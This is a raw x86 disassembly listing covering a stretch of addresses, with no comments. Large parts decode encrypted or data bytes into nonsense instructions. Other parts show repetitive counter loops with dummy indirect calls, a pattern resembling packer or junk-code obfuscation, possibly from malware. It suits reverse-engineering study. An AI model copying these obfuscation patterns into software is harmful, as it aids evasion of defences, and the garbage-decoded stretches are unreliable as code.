  403066:	ins    BYTE PTR es:[edi],dx
  403067:	ficomp WORD PTR gs:[ebx-0x14316b7f]
  40306e:	push   ebp
  40306f:	mov    esi,0x52b8356e
  403074:	adc    bl,BYTE PTR [edx]
  403076:	cmp    BYTE PTR [edx-0x665ad52a],bl
  40307c:	inc    eax
  40307d:	and    esi,DWORD PTR [ebx]
  40307f:	fisub  WORD PTR [edx]
  403081:	out    0x31,al
  403083:	adc    DWORD PTR [eax+0x16471f53],edi
  403089:	test   DWORD PTR [ebx],ebp
  40308b:	ficom  DWORD PTR [ecx-0x2561acb7]
  403091:	inc    edi
  403092:	fiadd  WORD PTR [ecx-0x7c6c187]
  403098:	adc    eax,0x79768cb
  40309d:	push   esi
  40309e:	scas   eax,DWORD PTR es:[edi]
  40309f:	call   0xa45bfe1b
  4030a4:	popa   
  4030a5:	add    eax,0xfc2ec7c5
  4030aa:	pop    ebx
  4030ab:	out    dx,eax
  4030ac:	(bad)
  4030af:	test   al,0x3e
  4030b1:	xor    DWORD PTR [eax-0x73],ecx
  4030b4:	adc    eax,0xf9101807
  4030b9:	std    
  4030ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030bb:	mov    ah,0xa3
  4030bd:	lahf   
  4030be:	dec    esi
  4030bf:	mov    edi,0xc2354f40
  4030c4:	dec    ebp
  4030c5:	inc    edi
  4030c6:	(bad)  
  4030c7:	nop    ecx
  4030ca:	js     0x40308b
  4030cc:	jmp    0xcaf3a681
  4030d1:	nop
  4030d2:	clc    
  4030d3:	mov    ch,0xca
  4030d5:	inc    ebp
  4030d6:	aaa    
  4030d7:	call   0x68f0:0x8f1917d5
  4030de:	fwait
  4030df:	test   al,0x44
  4030e1:	fs pop ebx
  4030e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030e4:	xchg   edi,eax
  4030e5:	(bad)  
  4030e7:	mov    bl,0xde
  4030e9:	jl     0x40316a
  4030eb:	push   es
  4030ec:	mov    ecx,edx
  4030ee:	pop    eax
  4030ef:	xchg   BYTE PTR [ecx+eiz*8-0x65eb23d1],dh
  4030f6:	lock rcl dl,0xd6
  4030fa:	(bad)  [ebx]
  4030fc:	mov    bl,0xb4
  4030fe:	push   0xffffff87
  403100:	mov    esp,0xba505589
  403105:	mov    al,0xb5
  403107:	aas    
  403108:	dec    ebp
  403109:	or     al,0xad
  40310b:	xchg   BYTE PTR [ebx+esi*4+0x1b],cl
  40310f:	mov    esi,0x8a59a6e1
  403114:	fdiv   QWORD PTR [ecx+ebx*8+0x47]
  403118:	adc    bl,bh
  40311a:	and    BYTE PTR [edx+0x2e],al
  40311d:	xchg   esp,eax
  40311e:	jecxz  0x4030f1
  403120:	in     al,dx
  403121:	pop    edx
  403122:	sub    ecx,ecx
  403124:	inc    esi
  403125:	pxor   xmm7,XMMWORD PTR [edi+ebp*2]
  40312a:	mov    esi,cs
  40312c:	sub    DWORD PTR gs:[ecx+0x733bb56d],ecx
  403133:	xchg   ecx,eax
  403134:	daa    
  403135:	scas   al,BYTE PTR es:[edi]
  403136:	or     DWORD PTR [ebx+0x52d92831],ebp
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx-0x5afc3ea4],0x79
  40315f:	mov    ch,0xba
  403161:	pop    ss
  403162:	jle    0x4031e2
  403164:	cli    
  403165:	jg     0x4031e5
  403167:	jle    0x4031da
  403169:	jmp    0x403177
  40316b:	ss sbb al,0xb8
  40316e:	xor    ah,ch
  403170:	retf   0x2144
  403173:	mov    eax,0xbc7824a9
  403178:	cmp    DWORD PTR [eax],ecx
  40317a:	jp     0x4031f9
  40317c:	iret   
  40317d:	pop    ebx
  40317e:	jmp    0x73765cba
  403183:	sbb    ebx,edi
  403185:	rcl    DWORD PTR [ebp+0x5198744e],cl
  40318b:	in     al,0x91
  40318d:	and    al,0xcd
  40318f:	push   cs
  403190:	div    BYTE PTR [eax+eiz*4]
  403193:	cdq    
  403194:	pop    edi
  403195:	push   edx
  403196:	jo     0x4031f1
  403198:	(bad)  
  403199:	pop    es
  40319a:	mul    DWORD PTR gs:[eax]
  40319d:	push   esi
  40319e:	or     al,0x4d
  4031a0:	cmp    ecx,DWORD PTR [ebx]
  4031a2:	gs imul ecx,ebx,0xdf532941
  4031a9:	adc    ecx,DWORD PTR [ecx]
  4031ab:	or     al,0x3
  4031ad:	aas    
  4031ae:	xchg   ecx,eax
  4031af:	rol    BYTE PTR [ebp-0x4c],1
  4031b2:	aas    
  4031b3:	bound  edx,QWORD PTR [esi-0x51752f62]
  4031b9:	pop    ebx
  4031ba:	add    al,0x17
  4031bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031bd:	xor    al,0x71
  4031bf:	xor    eax,0xa052b715
  4031c4:	inc    edi
  4031c5:	push   cs
  4031c6:	xchg   ebp,eax
  4031c7:	out    0xc3,al
  4031c9:	or     ch,BYTE PTR [eax]
  4031cb:	scas   eax,DWORD PTR es:[edi]
  4031cc:	xchg   ecx,eax
  4031cd:	mov    DWORD PTR [edx],edi
  4031cf:	daa    
  4031d0:	pushf  
  4031d1:	pop    ebp
  4031d2:	das    
  4031d3:	ror    al,1
  4031d5:	dec    edi
  4031d6:	jmp    0xdd360435
  4031db:	jmp    0xce66dc8e
  4031e0:	stos   DWORD PTR es:[edi],eax
  4031e1:	xor    esi,DWORD PTR [ebx]
  4031e3:	(bad)  
  4031e5:	ins    DWORD PTR es:[edi],dx
  4031e6:	xchg   esp,eax
  4031e7:	cs pop edi
  4031e9:	or     eax,0xbf01a044
  4031ee:	out    dx,al
  4031ef:	fidiv  WORD PTR [ebp-0x1bfbcc81]
  4031f5:	mov    al,BYTE PTR [ebx]
  4031f7:	pop    ecx
  4031f8:	pop    ecx
  4031f9:	cdq    
  4031fa:	mov    esi,ebx
  4031fc:	pop    edi
  4031fd:	mov    ecx,0x762f2494
  403202:	inc    eax
  403203:	fwait
  403204:	(bad)  
  403205:	mov    ebx,0xf9fabf03
  40320a:	(bad)  
  40320b:	pusha  
  40320c:	jbe    0x403276
  40320e:	push   ecx
  40320f:	aam    0x5
  403211:	aad    0x11
  403213:	sbb    DWORD PTR [eax+0x36],ebp
  403216:	pop    ebx
  403217:	cmp    BYTE PTR [eax],dh
  403219:	pop    ebx
  40321a:	fcomip st,st(4)
  40321c:	jmp    0x1f936e7b
  403221:	lds    edx,FWORD PTR [ecx-0x722d9e6]
  403227:	icebp  
  403228:	cli    
  403229:	pop    ebp
  40322a:	idiv   DWORD PTR [ecx+eax*2]
  40322d:	inc    edi
  40322e:	retf   
  40322f:	shr    BYTE PTR [ecx+0x22],0x4
  403233:	or     ah,0xd7
  403236:	test   eax,0x4eebe831
  40323b:	dec    ebx
  40323c:	loop   0x4031f8
  40323e:	mov    bh,0x1d
  403240:	fisub  DWORD PTR [eax+0x3f]
  403243:	mov    eax,ds:0x32e9f80e
  403248:	dec    edx
  403249:	les    eax,FWORD PTR [edi+0x59]
  40324c:	jae    0x40320e
  40324e:	ficomp WORD PTR [ebp-0x2c9e1aa2]
  403254:	dec    esp
  403255:	jbe    0x4032b3
  403257:	(bad)
  40325a:	pop    ecx
  40325b:	stos   BYTE PTR es:[edi],al
  40325c:	fiadd  WORD PTR [esi]
  40325e:	ss fsubp st(2),st
  403261:	inc    edx
  403262:	xchg   edx,eax
  403263:	cmp    eax,0xa9d9daca
  403268:	bound  ebp,QWORD PTR [ecx-0x50bdcd42]
  40326e:	pop    esi
  40326f:	xadd   BYTE PTR [ebx+ebx*4],bh
  403273:	das    
  403274:	lds    ebp,FWORD PTR [ebx-0x3e690580]
  40327a:	fcom   DWORD PTR [ebx]
  40327c:	out    dx,al
  40327d:	add    edx,ebx
  40327f:	cmp    BYTE PTR [ebx-0x5bd528ad],0xa1
  403286:	mov    eax,0xb58f2a6b
  40328b:	inc    ecx
  40328c:	jecxz  0x4032ea
  40328e:	shr    DWORD PTR [eax+esi*8+0x20],cl
  403292:	xchg   ebx,eax
  403293:	inc    ebp
  403294:	data16 int3 
  403296:	jg     0x4032e4
  403298:	leave  
  403299:	xchg   esp,eax
  40329a:	cs pop ecx
  40329c:	mov    bl,0x80
  40329e:	xor    eax,0x9ca833da
  4032a3:	xchg   ebp,eax
  4032a4:	mov    dh,0xe8
  4032a6:	lds    eax,FWORD PTR [esi-0x5d]
  4032a9:	push   ds
  4032aa:	sbb    edx,DWORD PTR [edi]
  4032ac:	jg     0x403245
  4032ae:	jne    0x40324e
  4032b0:	pop    edx
  4032b1:	loop   0x403265
  4032b3:	or     esi,DWORD PTR [esi-0x6b73b12d]
  4032b9:	or     cl,BYTE PTR [eax]
  4032bb:	mov    eax,0xe6f4a524
  4032c0:	mov    es,WORD PTR [eax+0x1c]
  4032c3:	iret   
  4032c4:	xchg   edi,eax
  4032c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032c6:	ror    DWORD PTR [ebp+0x5dad357f],cl
  4032cc:	inc    ebx
  4032cd:	sbb    eax,0x9c8c2b2f
  4032d2:	fistp  QWORD PTR [edx-0x4494d0db]
  4032d8:	das    
  4032d9:	das    
  4032da:	das    
  4032db:	push   ss
  4032dc:	xor    eax,0x4315f727
  4032e1:	xchg   ebp,eax
  4032e2:	adc    BYTE PTR [ebx-0x141a8b67],ah
  4032e8:	mov    cl,0x35
  4032ea:	test   DWORD PTR [esi+0x5e],eax
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x4336db,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x4336db
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x4336db,ecx
  40331d:	cmp    DWORD PTR ds:0x4336db,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x4336db,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x43376f,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x433757,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43369f
  40336b:	add    DWORD PTR ds:0x433683,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x4336d7,0x1e
  40338b:	cmp    DWORD PTR ds:0x4336d7,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x4336d7,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x4336d7,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x4336d7
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x4336d7,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x4336d7
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x4336d7,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x433767
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x4336c7
  4033f2:	mov    edi,DWORD PTR ds:0x433707
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x4336e7,0x1c
  40340f:	cmp    DWORD PTR ds:0x4336e7,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x4336e7,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x4336e7,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x4336e7
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x4336e7,edi
  40344c:	mov    edi,DWORD PTR ds:0x4336e7
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x4336e7,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x433763
  403467:	and    edx,DWORD PTR ds:0x433797
  40346d:	mov    DWORD PTR ds:0x433763,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43371b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43379f
  40349f:	adc    DWORD PTR ds:0x43367f,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433797,0x10
  4034c6:	cmp    DWORD PTR ds:0x433797,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433797,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433797,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433797
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433797,edi
  403505:	mov    edi,DWORD PTR ds:0x433797
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433797,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x4337ab,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x3dbcd48a]
  403537:	sbb    eax,0x7e15c6ab
  40353c:	jle    0x403596
  40353e:	jl     0x4035be
  403540:	jle    0x40356a
  403542:	gs xchg ebx,eax
  403544:	loopne 0x403587
  403546:	mov    bl,0x57
  403548:	sub    eax,0xef18bb3b
  40354d:	repnz cmp DWORD PTR [edi],ecx
  403550:	xchg   DWORD PTR [ecx],esp
  403552:	mov    cl,0x2b
  403554:	xor    dh,0x94
  403557:	and    al,0xc1
  403559:	into   
  40355a:	lahf   
  40355b:	repz imul edx,DWORD PTR [esi+0x1f9ec9ad],0xa2ceddad
  403566:	sbb    BYTE PTR [esi-0x7d1c6bdf],cl
  40356c:	xchg   edi,eax
  40356d:	lods   al,BYTE PTR ds:[esi]
  40356e:	mov    esi,DWORD PTR [ebp-0xf]
  403571:	pop    esp
  403572:	pusha  
  403573:	ret    
  403574:	dec    esi
  403575:	push   ss
  403576:	lea    edx,[ebp+eiz*4+0x3e8013f9]
  40357d:	xchg   ecx,eax
  40357e:	and    ecx,0xf86e28b9
  403584:	outs   dx,DWORD PTR es:[esi]
  403586:	neg    DWORD PTR [ebx-0x76]
  403589:	xorps  xmm1,xmm5
  40358c:	cmp    BYTE PTR [ebx],dl
  40358e:	shl    BYTE PTR [ebx+0x7e07e950],0xaf
  403595:	ds nop
  403597:	lds    ebp,FWORD PTR [eax+0x13bd1235]
  40359d:	mov    ecx,0x12de0fc4
  4035a2:	shl    DWORD PTR [edi+eiz*1+0x1b7e7ae7],0x34
  4035aa:	neg    ch
  4035ac:	clc    
  4035ad:	nop
  4035ae:	test   eax,0xeabe2a5d
  4035b3:	enter  0xa0d4,0x2c
  4035b7:	fild   DWORD PTR [edi-0x32cba89b]
  4035bd:	(bad)  
  4035be:	mov    ds:0xd02dbe3d,al
  4035c3:	cdq    
  4035c4:	mov    ecx,ebp
  4035c6:	pop    ds
  4035c7:	sahf   
  4035c8:	sar    DWORD PTR [esi+eiz*8],0x10
  4035cc:	(bad)  
  4035cd:	in     eax,0xa5
  4035cf:	dec    ecx
  4035d0:	inc    edx
  4035d1:	out    0x6a,al
  4035d3:	jmp    0x403589
  4035d5:	jp     0x40362b
  4035d7:	or     ebp,DWORD PTR [edx+0x7606de43]
  4035dd:	sub    al,0x9e
  4035df:	lods   al,BYTE PTR ds:[esi]
  4035e0:	aaa    
  4035e1:	neg    ah
  4035e3:	dec    esp
  4035e4:	mov    ah,0xd8
  4035e6:	dec    ebp
  4035e7:	loop   0x403578
  4035e9:	addr16 enter 0xe08,0x77
  4035ee:	cdq    
  4035ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035f1:	inc    esi
  4035f2:	(bad)  
  4035f3:	gs js  0x40365c
  4035f6:	jge    0x403654
  4035f8:	ds push cs
  4035fa:	in     al,dx
  4035fb:	push   0xffffffb3
  4035fd:	loopne 0x403582
  4035ff:	outs   dx,BYTE PTR ds:[esi]
  403600:	cmp    al,0x7a
  403602:	(bad)  
  403603:	mov    cl,0x91
  403605:	mov    ds:0xfee69cdb,al
  40360a:	es test al,0x82
  40360d:	lds    esi,FWORD PTR [edi+0x5e]
  403610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403611:	(bad)  
  403612:	(bad)  
  403613:	push   edi
  403614:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403616:	and    al,0xaf
  403618:	in     al,dx
  403619:	add    bh,cl
  40361b:	arpl   WORD PTR [ebx+edi*8],cx
  40361e:	jbe    0x403687
  403620:	fstp   DWORD PTR [edi+0x8]
  403623:	mov    al,ds:0xf5d8f032
  403628:	daa    
  403629:	xchg   ecx,eax
  40362a:	mov    bl,0xad
  40362c:	sbb    BYTE PTR [ebx],bl
  40362e:	dec    eax
  40362f:	jecxz  0x403627
  403631:	push   0xffffff80
  403633:	inc    esp
  403634:	or     al,cl
  403636:	retf   
  403637:	popf   
  403638:	or     DWORD PTR [esi-0x24348c54],ebx
  40363e:	shl    al,cl
  403640:	mov    dh,0x99
  403642:	sbb    ebp,DWORD PTR ds:0x9f70b9d0
  403648:	lds    esi,FWORD PTR [edx-0x4cacfb21]
  40364e:	jg     0x4036cc
  403650:	call   0x5de7:0x477c5f05
  403657:	jmp    0x77d1d9d8
  40365c:	xor    BYTE PTR [eax-0x10],al
  40365f:	shl    BYTE PTR [esi],cl
  403661:	shl    al,0x3d
  403664:	outs   dx,BYTE PTR ds:[esi]
  403665:	cmp    al,0x80
  403667:	xor    bh,0xed
  40366a:	mov    eax,0xe60fab07
  40366f:	jg     0x4036cc
  403671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403672:	lods   eax,DWORD PTR ds:[esi]
  403673:	out    0xe4,al
  403675:	icebp  
  403676:	clc    
  403677:	pop    ebp
  403678:	and    ebx,DWORD PTR [ebx-0x5e]
  40367b:	add    DWORD PTR [esi],0xffffffea
  40367e:	dec    ebx
  40367f:	loop   0x403623
  403681:	out    0xf,al
  403683:	push   ebp
  403684:	(bad)  
  403685:	bound  ebx,QWORD PTR [eax+esi*8+0x6]
  403689:	add    eax,0xd13b0d3e
  40368e:	add    dl,BYTE PTR [ebp+eax*2+0x6]
  403692:	arpl   di,bx
  403694:	xchg   ecx,eax
  403695:	mov    ecx,ebp
  403697:	ja     0x403684
  403699:	and    DWORD PTR [eax+0x401f1ca6],ebp
  40369f:	push   ebx
  4036a0:	pusha  
  4036a1:	test   eax,0x570a11de
  4036a6:	aam    0xb7
  4036a8:	pop    ebp
  4036a9:	sub    DWORD PTR [esi],edi
  4036ab:	enter  0x3426,0x75
  4036af:	ror    BYTE PTR [ecx-0x4b],0x47
  4036b3:	xchg   ebp,eax
  4036b4:	xchg   ebx,eax
  4036b5:	jmp    0xa63f5cc6
  4036ba:	adc    BYTE PTR [edi+0x61800203],al
  4036c0:	jmp    0x403650
  4036c2:	xor    dh,BYTE PTR [ecx]
  4036c4:	cmp    ax,0xd25a
  4036c8:	mov    bl,0x21
  4036ca:	dec    ecx
  4036cb:	mov    esp,0x7fd37f1d
  4036d0:	sub    esp,edi
  4036d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036d3:	aad    0xb9
  4036d5:	or     eax,esi
  4036d7:	adc    esp,esp
  4036d9:	(bad)  
  4036da:	int    0xcf
  4036dc:	mov    esp,0x1558663d
  4036e1:	aam    0x6b
  4036e3:	mov    edi,0xf261a3a5
  4036e8:	fdiv   QWORD PTR [ecx]
  4036ea:	push   edi
  4036eb:	pop    ss
  4036ec:	aad    0x5e
  4036ee:	inc    ebx
  4036ef:	cdq    
  4036f0:	fwait
  4036f1:	push   ds
  4036f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036f3:	adc    ah,BYTE PTR [esi-0x3a887d25]
  4036f9:	ret    0x47e9
  4036fc:	inc    esp
  4036fd:	xor    DWORD PTR [eax-0x41fcd689],esp
  403703:	xor    cl,BYTE PTR [edx+0x4fb7162a]
  403709:	inc    esi
  40370a:	add    BYTE PTR [ebx+0x18742ee2],ch
  403710:	test   eax,0xd2c6d491
  403715:	int    0x4e
  403717:	push   esp
  403718:	add    ebx,DWORD PTR es:[eax+0x7a59a9a]
  40371f:	(bad)  [edi+0x5f]
  403722:	mov    al,ds:0x2e078569
  403727:	pop    eax
  403728:	mov    eax,0xd86cd552
  40372d:	cmp    ecx,edx
  40372f:	or     BYTE PTR [eax+0xf31a500],bh
  403735:	inc    esp
  403736:	mov    dl,0x9d
  403738:	sbb    esi,esp
  40373a:	or     DWORD PTR [edx],0x42
  40373d:	sbb    edi,0xc755492e
  403743:	pop    ebx
  403744:	mov    ds:0xc7edca08,eax
  403749:	or     eax,0x83f0c9ee
  40374e:	out    dx,eax
  40374f:	test   eax,0xc3e8e757
  403754:	mov    bl,0x33
  403756:	clc    
  403757:	dec    esp
  403758:	adc    DWORD PTR [esi],esi
  40375a:	xlat   BYTE PTR ds:[ebx]
  40375b:	inc    edi
  40375c:	inc    esi
  40375d:	xchg   ecx,eax
  40375e:	jmp    0x9ea0:0x40db297c
  403765:	xchg   ebp,eax
  403766:	cdq    
  403767:	jae    0x4037a3
  403769:	pop    ds
  40376a:	add    DWORD PTR [ebx+0x36],esp
  40376d:	dec    esp
  40376e:	mov    cl,0x57
  403770:	and    BYTE PTR [ebx],ah
  403772:	pushf  
  403773:	daa    
  403774:	jmp    DWORD PTR [eax+0x9f45ec3]
  40377a:	mov    ebx,0x8c9b3774
  40377f:	aaa    
  403780:	and    DWORD PTR [edi-0xa],0xbdc4de89
  403787:	leave  
  403788:	call   DWORD PTR [edx-0x74]
  40378b:	test   al,0x20
  40378d:	repz sahf 
  40378f:	fwait
  403790:	int    0xa2
  403792:	sub    al,bl
  403794:	jg     0x403791
  403796:	imul   esp,DWORD PTR [esi],0xcb4e0326
  40379c:	mov    dl,0xa3
  40379e:	js     0x40380b
  4037a0:	xchg   eax,eax
  4037a2:	out    dx,eax
  4037a3:	stos   BYTE PTR es:[edi],al
  4037a4:	fwait
  4037a5:	mov    esi,0xa25d807a
  4037aa:	mov    ah,0x50
  4037ac:	jns    0x4037d7
  4037ae:	imul   eax,ebp,0x8cb5b0fe
  4037b4:	and    ch,ch
  4037b6:	or     ah,BYTE PTR gs:[edx]
  4037b9:	pop    esi
  4037ba:	fadd   QWORD PTR [edi-0x44]
  4037bd:	sbb    ebp,DWORD PTR [ebx-0xb7bd9b5]
  4037c3:	sbb    eax,0x70a657b8
  4037c8:	loopne 0x403770
  4037ca:	push   0xffffffee
  4037cc:	jo     0x403842
  4037ce:	mov    bl,0xaa
  4037d0:	sbb    DWORD PTR [ecx+0x77],esi
  4037d3:	pushf  
  4037d4:	cs mov dl,0x30
  4037d7:	imul   esp,DWORD PTR [ebp+eax*1+0x4e],0xb
  4037dc:	aad    0xa9
  4037de:	lods   eax,DWORD PTR ds:[esi]
  4037df:	aam    0x73
  4037e1:	push   ebx
  4037e2:	pop    esp
  4037e3:	or     esp,eax
  4037e5:	cdq    
  4037e6:	in     al,0xcd
  4037e8:	cmp    al,BYTE PTR [esi-0x10]
  4037eb:	dec    ebx
  4037ec:	in     eax,dx
  4037ed:	jmp    0xee76f416
  4037f2:	cdq    
  4037f3:	std    
  4037f4:	into   
  4037f5:	and    DWORD PTR es:[edx+edi*2-0x14],ebx
  4037fa:	add    cl,BYTE PTR [eiz*1-0x19bcfe5]
  403801:	adc    edx,DWORD PTR [esi-0x3c]
  403804:	lds    esp,FWORD PTR [ebx+0x6d02c074]
  40380a:	jae    0x403793
  40380c:	iret   
  40380d:	cli    
  40380e:	cmp    al,0x47
  403810:	and    esi,ebx
  403812:	mov    DWORD PTR [ebx],ebp
  403814:	or     edx,DWORD PTR [ebp+eiz*1-0x68]
  403818:	nop
  403819:	stc    
  40381a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40381b:	jl     0x403818
  40381d:	mov    al,al
  40381f:	call   0xf3dcc4af
  403824:	xor    DWORD PTR [edi+0x4f],esp
  403827:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40382e:	sbb    edi,DWORD PTR ds:0x43367b
  403834:	mov    edx,DWORD PTR [ebp+0x8]
  403837:	sbb    edi,DWORD PTR ds:0x43372b
  40383d:	xor    edx,eax
  40383f:	and    DWORD PTR ds:0x4337a7,0x0
  403849:	xor    edi,edi
  40384b:	add    edi,DWORD PTR ds:0x4337a7
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x4337a7,edi
  403858:	cmp    DWORD PTR ds:0x4337a7,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x4337a7,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x4337a7
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x4337a7,edi
  40389c:	cmp    DWORD PTR ds:0x4337a7,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x4336eb,0x4337ab
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433713,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x43376b,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x4337a7,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x43376b,0x43372b
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x43367b,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433697,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433693,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43379b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x43367f,0x1d
  403935:	cmp    DWORD PTR ds:0x43367f,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x43367f,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x43367f,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x43367f
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x43367f,ebx
  403985:	mov    ebx,DWORD PTR ds:0x43367f
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x43367f,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x4336e7
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433693
  4039a6:	sub    edi,DWORD PTR ds:0x4337a3
  4039ac:	mov    DWORD PTR ds:0x433693,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433687,0x1b
